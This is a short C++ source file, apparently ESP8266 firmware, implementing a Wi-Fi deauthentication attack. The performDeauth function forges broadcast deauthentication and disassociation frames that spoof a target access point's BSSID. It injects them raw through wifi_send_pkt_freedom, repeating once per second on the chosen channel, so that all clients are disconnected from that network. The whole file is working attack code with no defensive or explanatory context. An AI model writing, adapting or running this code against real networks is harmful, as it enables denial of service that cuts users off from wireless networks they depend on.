#include "Deauth.h"

void Deauth::performDeauth(const uint8_t *bssid, uint8_t channel) {
    if (millis() - deauth_now >= 1000) {
        wifi_set_channel(channel);

        uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x00, 0x00, 0x01, 0x00};

        memcpy(&deauthPacket[10], bssid, 6);
        memcpy(&deauthPacket[16], bssid, 6);
        deauthPacket[24] = 1;

        Serial.println(Utils::bytesToStr(deauthPacket, 26));
        deauthPacket[0] = 0xC0;
        Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
        Serial.println(Utils::bytesToStr(deauthPacket, 26));
        deauthPacket[0] = 0xA0;
        Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

        deauth_now = millis();
    }
}